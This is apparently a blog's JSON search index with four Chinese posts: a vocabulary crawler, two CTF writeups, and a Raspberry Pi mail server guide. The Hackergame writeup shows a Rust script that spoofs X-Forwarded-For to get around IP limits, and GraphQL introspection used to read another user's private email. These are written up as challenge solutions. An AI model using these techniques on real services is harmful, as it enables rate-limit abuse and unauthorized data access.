{"posts":[{"title":"两岸差异用词爬虫","text":"写在开头 - Java 大法好 昨天我在把一个电影字幕从繁体转成简体时，发现转完后有一些台湾地区的用词（繁体字幕大部分都是台湾的），所以突发灵感想写个翻译程序。 首先得有个词库，Chinese Linguipedia 这个网站，里边有个两岸差异用词，看上去挺全的，就选它了。 词语有三级分类，每页最多十行，链接如此：http://chinese-linguipedia.org/clk/diff?class=二级分类编号&amp;classNa=三级分类名称&amp;page=页面 编号范围是 1~34，其中 1~5 是五个一级分类的编号。因为爬下来的数据要细分，所以就忽略大分类，直接从分类 6~34 每一页遍历过去获取。同时，只有 6, 7, 8 三个二级分类下有三级分类，这些分类我手打进了一个 json 里。 然后是网页处理部分 每一页都有几段这样的 html： 123&lt;td align='center';&gt;同實異名&lt;/td&gt;&lt;td class=&quot;head3&quot; style=&quot;font-family:'微軟正黑體';font-size:1.1em;&quot;&gt;&lt;a href=&quot;&quot;&gt;&lt;a href=&quot;http://chinese-linguipedia.org/clk/search/刀具/0/0?srchType=1&quot;&gt;刀具&lt;/a&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class=&quot;head3&quot; style=&quot;font-family:'微軟正黑體';font-size:1.1em;&quot;&gt;&lt;a href=&quot;&quot;&gt;&lt;a href=&quot;http://chinese-linguipedia.org/clk/search/刀具/0/0?srchType=1&quot;&gt;刀具&lt;/a&gt;/&lt;a href=&quot;http://chinese-linguipedia.org/clk/search/刃具/0/0?srchType=1&quot;&gt;刃具&lt;/a&gt;&lt;/a&gt;&lt;/td&gt; 首先通过正则表达式 &lt;td align='center';&gt;(.*?)&lt;/td&gt;\\r\\n(.*?)\\r\\n(.*)取出 $1 “同異類別”、$2 “臺灣語詞” 的元素、$3 “大陸語詞” 的元素然后用另一个正则表达式 1\\&quot;&gt;([\\s\\S]*?)&lt;/a 匹配 $2 和 $3，得到每个“臺灣語詞”和“大陸語詞”，之后以/为分隔符合并向 output.csv 文件写入一行：一级分类,二级分类,三级分类,同異類別,臺灣語詞,大陸語詞 有人可能注意到上面用了一个 [\\s\\S]，这里是因为网站的数据有点问题，有一条记录的词里边有个换行，导致获取不到这条记录。 合并字符串集合或数组，用到了一个 Java 8 String 类的新方法 String.join，第一个参数是分隔符字符串，第二个参数是一个集合或者数组 至于翻译程序，晚点再来弄，目前计划是检测到一个台湾用词，就显示出相对应的所有大陆用词，可以自定义更改的词语。 需要考虑到一个词语重叠问题，和类似于“簡訊地址”这样的词语的翻译问题，应该需要翻译为“联系方式”。 还有一些这个词库里没有涉及到的词语，例如“聯絡”和“联系”，网站上面显示的是大陆“今不用”此词语，可以通过增加的方法来完善。 同时这个网站支持通配符查询功能，应该可以将整部字典都爬下来，只是一个时间问题。 若有哪位大神比较熟悉于这方面的问题，我们可以互相讨论一下，来共同完成这个项目。 本项目的 GitHub：https://github.com/yescallop/ChineseLinguipediaCrawler PS: 微软系列产品不能正确识别无 BOM 头的 UTF-8 编码文件，需要在写入数据之前在文件头写入 BOM 头 0xEFBBBF PPS: 这个网站早已大改，我对 Java 的记忆也已变淡，谨以此篇留作纪念。","link":"/p/clcrawler/"},{"title":"1st PKU GeekGame Writeup","text":"未完待续. →签到←用浏览器打开文件，全选复制，得到两行文本： Original Text12fa{aeAGetTm@ekaev!lgHv__ra_ieGeGm_1} 将两行字符交错置于一行，得 flag{Have_A_Great_Time@GeekGame_v1!}. 小北问答 Remake 北京大学燕园校区有理科 1 号楼到理科 X 号楼，但没有理科 (X+1) 号及之后的楼。X 是？ 5. 搜索可得. 上一届（第零届）比赛的总注册人数有多少？ 407. 见相关报道. geekgame.pku.edu.cn 的 HTTPS 证书曾有一次忘记续期了，发生过期的时间是？ 2021-07-11T08:49:53+08:00. 见 Censys. 注意时区. 2020 年 DEFCON CTF 资格赛签到题的 flag 是？ OOO{this_is_the_welcome_flag}. 见 Scoreboard. 在大小为 672328094 * 386900246 的方形棋盘上放 3 枚（相同的）皇后且它们互不攻击，有几种方法？ 2933523260166137923998409309647057493882806525577536. 归纳可得通项. 上一届（第零届）比赛的“小北问答1202”题目会把所有选手提交的答案存到 SQLite 数据库的一个表中，这个表名叫？ submits. 见 GitHub. 国际互联网由许多个自治系统（AS）组成。北京大学有一个自己的自治系统，它的编号是？ AS59201. 见 IPIP.net ASN Search. 排除 CERNET2 节点 AS24349. 截止到 2021 年 6 月 1 日，完全由北京大学信息科学技术学院下属的中文名称最长的实验室叫？ 区域光纤通信网与新型光通信系统国家重点实验室. 在该学院网站下搜索并手动比较可得.","link":"/p/gg-1st-wp/"},{"title":"Hackergame 2021 Writeup","text":"这次做出来的题比较少，于是只有一篇 Writeup。 签到 为了能让大家顺利签到，命题组把每一秒的 flag 都记录下来制成了日记本的一页。你只需要打开日记，翻到 Hackergame 2021 比赛进行期间的任何一页就能得到 flag！ 打开题目就是熟悉的 1970 年 1 月 1 日，每点一次 Next 就会 +1s，这让我不禁想到了些什么。于是直接搜索 时间戳，复制，粘贴到地址栏替换 page 参数，回车就得到 flag。 进制十六——参上映入眼帘的是一张图片，右边的 flag 被遮住了，但左边有其字符对应的十六进制值。 打开 Sublime Text，把对应的十六进制值一股脑输进去，以十六进制编码保存，重新用 UTF-8 编码打开，即得到 flag。 去吧！追寻自由的电波 「X 同学使用了无线电中惯用的方法来区分字符串中读音相近的字母」「最终接受到的录音的速度有所改变」 读完题后首先听了听音频，确实听不清，于是用软件放慢到 0.25 倍，结合题目就大致清楚方向了（因为听过一些 ATC，这时我开始窃喜）。 搜到了 国际无线电通话拼写字母 列表后，经过一番艰苦卓绝的英语听力，终于听出了如下原文（这时我已心力憔悴）： Original Text1234Foxtrot Lima Alpha Golfleft bracketPapa Hotel Oscar November Echo Tango India Charlie Alpha Bravoright bracket 即 flag{phoneticab}。 然而比赛之后我一听官方题解里放慢的音频，好家伙，怎么这么清晰？原来是因为当时我放慢音频的时候保持了原音调，按改变音调的正确方法放慢到 1/3 后甚至比题解里的还清晰。 您的浏览器不支持 audio 元素。 猫咪问答 Pro Max 2017 年，中科大信息安全俱乐部（SEC@USTC）并入中科大 Linux 用户协会（USTCLUG）。目前，信息安全俱乐部的域名（sec.ustc.edu.cn）已经无法访问，但你能找到信息安全俱乐部的社团章程在哪一天的会员代表大会上通过的吗？打开 Internet Archive 后，搜索 sec.ustc.edu.cn，随后在 这里 找到答案：20150504； 中国科学技术大学 Linux 用户协会在近五年多少次被评为校五星级社团？前往 USTC LUG 主页，一通寻找后在 这里 找到了相关介绍，我一数，得到答案 5； 中国科学技术大学 Linux 用户协会位于西区图书馆的活动室门口的牌子上“LUG @ USTC”下方的小字是？在 USTC LUG 站内搜索 西区图书馆，立即得到答案：Development Team of Library； 在 SIGBOVIK 2021 的一篇关于二进制 Newcomb-Benford 定律的论文中，作者一共展示了多少个数据集对其理论结果进行验证？在 SIGBOVIK 主页下找到其 2021 PDF，在 PDF 内搜索 Newcomb-Benford，看到有 14 张图片与数据有关。排除非二进制的第一张，可以确定答案为 13； 不严格遵循协议规范的操作着实令人生厌，好在 IETF 于 2021 年成立了 Protocol Police 以监督并惩戒所有违背 RFC 文档的行为个体。假如你发现了某位同学可能违反了协议规范，根据 Protocol Police 相关文档中规定的举报方法，你应该将你的举报信发往何处？找到相关文档 IETF RFC 8962，忍住不笑看到第六节，得到答案 /dev/null。 卖瓜看到这题，我最开始想到的是放负数个瓜（实际上并没有用，怎么放都是三的倍数），但后端不让：操作无效：不能放负数个瓜。 于是通过放上较多的瓜测试得出应该要溢出 64 位有符号整数，进一步尝试后找到方法： 令 a = (2 ^ 63 - 1) / 6 = 1537228672809129301，依次放上 6 斤的瓜 a, (a + 1) 个，这时电子秤上就有 -2 斤瓜。 重复上述操作后再放上 6 斤的瓜 4 个即可得到 flag。 透明的文件搜索后得知文件内的文本为 ANSI 转义序列， 其中每个左方括号 [ 前应有一个 ESC 字符 (0x1B)。要正确显示此序列，需要将所有 [ 替换为 \\e[，并在一个优质终端（例如 Git Bash）中使用命令 echo -e 打印。 将命令写入 shell 脚本后运行，发现终端内的部分文字出现了缺失，右键全选后才能显示出彩色 flag。 然而终端内仍有部分文字会影响 flag 的阅读，我们可以在脚本后加入一行 read -n 1，并运行 clear &amp;&amp; ./a.sh 来解决此问题。最终结果如下图所示： 旅行照片从图中的 活海鲜 招牌可以看出图中的地点是在海边，最开始我在地图上沿海岸线通过地形找了很久也没有结果，于是只能转向网络搜索。 通过关键词 肯德基 海滩 停车场 搜索，我在百度上找到了图中 KFC 分店的位置——秦皇岛新澳海底世界，那么接下来的题目就很简单了。 通过对比图片和地图，可以得出拍摄者的面朝方向为 东南； 由第 1 题可知楼影的朝向大致为东北，同时影子较长，于是可以判断拍摄时间大致为 傍晚； 注意到提示 小区内每栋楼的层高和海拔均相同，且地上部分楼层为从 1 开始的连续自然数，且图中的楼有 14 层的窗户可见，于是可以知道答案大致为 14，最终答案正好也为 14； 搜索得知 KFC 分店的电话号码是 0335-7168800； 运用街景地图得知这三个汉字为 海豚馆。 FLAG 助力大红包首先手动助力试了试，重复助力后提示 重复的 /8 地址。然而，由于 /8 IPv4 地址块 只有 256 个，通过常规方法显然是不能助力成功的，于是想到伪造地址来助力。 可以编写一个 Rust 程序来解答此题，其中用到的 HTTP Header X-Forwarded-For 被代理服务器用于表示请求端的真实 IP。 invite.rs12345678910111213141516use std::{thread, time::Duration};fn main() { let client = reqwest::blocking::Client::new(); for i in 0..=255 { let ip = format!(&quot;{}.241.53.1&quot;, i); let resp = client .post(&quot;http://202.38.93.111:10888/invite/uuid&quot;) .header(&quot;X-Forwarded-For&quot;, &amp;ip) .header(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;) .body(format!(&quot;ip={}&quot;, ip)) .send() .unwrap(); println!(&quot;{}&quot;, resp.text().unwrap()); thread::sleep(Duration::from_millis(1500)) }} 跑个几分钟就可得到 flag。 Amnesia - 轻度失忆搜索得知 .data 段用于存放已初始化的全局变量，而 .rodata 段用于存放常量数据，于是容易想到可以一个字符一个字符地打印。 amnesia_1.c1234567#include &quot;stdio.h&quot;int main() { putchar('H'); putchar('e'); putchar('l'); putchar('l'); putchar('o'); putchar(','); putchar(' '); putchar('w'); putchar('o'); putchar('r'); putchar('l'); putchar('d'); putchar('!');} 图之上的信息首先用测试账号登录，根据测试账号的笔记内容，结合题目中对 GraphQL 的描述，大致明白需要渗透 API 来获取 admin 账号的邮箱。 分析登录后界面的源代码，可以发现如下语句： Source123axios.post(&quot;/graphql&quot;, { query: &quot;{ notes(userId: 2) { id\\ncontents }}&quot;}) 从中可以看出 API 的路径、调用方法和参数。注意到 guest 的 userId 为 2，于是猜想 admin 的 userId 为 1。 更改 userId 并请求后，服务器返回了错误信息：This user has no permission to access this. 果然没有如此简单，那么我们进一步查找资料可以了解到 GraphQL 的安全问题：内省系统。可以通过如下的 query 来查询 GraphQL 中所有可用的类型、查询及参数： GraphQL Query12345678910111213{ __schema { types { name fields { name args { name } } } }} 查询后得到以下结果（经缩减）： Data_1123456789[ {&quot;name&quot;:&quot;Query&quot;,&quot;fields&quot;:[ {&quot;name&quot;:&quot;note&quot;,&quot;args&quot;:[{&quot;name&quot;:&quot;id&quot;}]}, {&quot;name&quot;:&quot;notes&quot;,&quot;args&quot;:[{&quot;name&quot;:&quot;userId&quot;}]}, {&quot;name&quot;:&quot;user&quot;,&quot;args&quot;:[{&quot;name&quot;:&quot;id&quot;}]} ]}, {&quot;name&quot;:&quot;GNote&quot;,&quot;fields&quot;:[{&quot;name&quot;:&quot;id&quot;,&quot;args&quot;:[]},{&quot;name&quot;:&quot;contents&quot;,&quot;args&quot;:[]}]}, {&quot;name&quot;:&quot;GUser&quot;,&quot;fields&quot;:[{&quot;name&quot;:&quot;id&quot;,&quot;args&quot;:[]},{&quot;name&quot;:&quot;username&quot;,&quot;args&quot;:[]},{&quot;name&quot;:&quot;privateEmail&quot;,&quot;args&quot;:[]}]}] 于是可以构造查询 { user(id: 1) { username\\nprivateEmail }}，请求后得到 flag: Data_21234{ &quot;username&quot;: &quot;admin&quot;, &quot;privateEmail&quot;: &quot;flag{dont_let_graphql_l3ak_data_8e9ec4ca0c@hackergame.ustc}&quot;} 赛博厨房Level 0稍微尝试了一下，发现保存程序后第二天的菜谱会变，但长度始终为 2。由于只有两种菜，且每次做菜前都会清理厨房，最多需要 4 个程序就能通关。 Level 1看到一堆 0 就写了一个循环，立刻通关： 赛博厨房1234567向右 1 步拿起 1 个物品向下 1 步向左 1 步放下 1 个物品向上 1 步如果手上的物品大于等于 0 向上跳转 6 行","link":"/p/hg-2021-wp/"},{"title":"在树莓派上搭建邮件服务器 Postfix + Dovecot + SASL","text":"最近入手了一台树莓派 3B，要把 ECS 上的各种服务器全部迁移到上面，配置邮件服务器的方法有些麻烦，所以在此写一篇教程分享给大家供借鉴。 更新 2017-04-29: 无法发送邮件，很久没有解决更新 2017-08-23: 发件问题已修复 准备环境Raspberry Pi 3 Model B，运行 Raspbian 最新版本 开始搭建首先通过 apt-get 获取 Postfix，Dovecot 和 SASL 我个人认为 IMAP 比 POP3 好，所以在此没有配置 POP3，如有需要请加上 dovecot-pop3d sudo apt-get install postfix dovecot-imapd sasl2-bin 配置 Postfix 和 SASL下面部分内容借鉴了 Debian 官方 Wiki 的文章 PostfixAndSASL 创建一个文件 /etc/postfix/sasl/smtpd.conf，内容如下 pwcheck_method: saslauthd mech_list: PLAIN LOGIN 复制 /etc/default/saslauthd 到 /etc/default/saslauthd-postfix，修改内容如下 START=yes DESC=&quot;SASL Auth. Daemon for Postfix&quot; NAME=&quot;saslauthd-postf&quot; # 最长为 15 字符 OPTIONS=&quot;-c -m /var/spool/postfix/var/run/saslauthd&quot; 创建 Postfix 改变根目录所需的子目录，命令： sudo dpkg-statoverride --add root sasl 710 /var/spool/postfix/var/run/saslauthd 将 postfix 用户加入组 sasl sudo adduser postfix sasl 重启 saslauthd 服务 sudo service saslauthd restart 编辑 Postfix 配置文件 /etc/postfix/main.cf，以我的域名 yescallop.cn 为例，修改内容如下 myhostname = yescallop.cn myorigin = $myhostname mydestination = $myhostname, localhost smtpd_sasl_local_domain = $myhostname smtpd_sasl_auth_enable = yes broken_sasl_auth_clients = yes smtpd_sasl_security_options = noanonymous smtpd_recipient_restrictions = permit_sasl_authenticated, reject_unauth_destination 重启 Postfix （重载配置是不够的） sudo service postfix restart 然后就可以使用 telnet 连接 25 端口测试了 配置 Dovecot 编辑 Dovecot 配置文件 /etc/dovecot/dovecot.conf，修改内容如下： listen = * 编辑认证配置文件 /etc/dovecot/conf.d/10-auth.conf，修改内容如下： disable_plaintext_auth = no auth_mechanisms = plain login 编辑 IMAP 配置文件 /etc/dovecot/conf.d/20-imap.conf，修改内容如下： mail_max_userip_connections = 100 # 此处可自定义，不要太小，容易导致连接被拒绝 重启 Dovecot sudo service dovecot restart 可以使用 telnet 连接 143 端口测试 最后可以添加 Postfix，Dovecot 和 SASL 到启动组 sudo update-rc.d postfix defaults sudo update-rc.d dovecot defaults sudo update-rc.d saslauthd defaults All Done!","link":"/p/mailserver/"}],"tags":[{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"}],"categories":[{"name":"数据","slug":"数据","link":"/categories/%E6%95%B0%E6%8D%AE/"},{"name":"Writeup","slug":"Writeup","link":"/categories/Writeup/"},{"name":"笔记","slug":"笔记","link":"/categories/%E7%AC%94%E8%AE%B0/"}],"pages":[{"title":"友情链接","text":"Name Bio weyung 写一些和我一样菜也能看懂的文章 TEL where are you 思梦Lri 欢迎来糖果屋品尝あめ~","link":"/links/"},{"title":"关于","text":"这里什么也没有 (`・ω・´) 话说，你知道我为什么叫 Scallop 吗？","link":"/about/"}]}